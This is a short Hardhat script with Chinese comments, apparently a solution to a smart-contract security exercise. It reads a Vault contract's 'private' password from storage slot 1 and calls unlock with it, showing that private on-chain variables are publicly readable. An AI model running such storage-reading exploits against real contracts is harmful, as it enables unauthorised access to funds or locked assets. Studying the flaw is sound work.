const { ethers } = require("hardhat");
/*
* 状态变量攻击
实现方式：私有变量只能保证不被其他合约访问，但依然是对外公开的，可以被外部用户访问到
*/

async function VaultScript(){
    // Vault合约地址
    const VaultAddress = "0xcD6906B2ea3fF967DE65A334607102509575Bc60";
    const vault = await ethers.getContractAt("Vault", VaultAddress);

    console.log("攻击前 locked = ",await vault.locked())

    // 通过存储槽获取状态变量值
    const passeord = await ethers.provider.getStorage(VaultAddress, 1);

    // 执行攻击
    const tx = await vault.unlock(passeord);
    await tx.wait();

    console.log("攻击后 locked = ",await vault.locked())
}

VaultScript().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});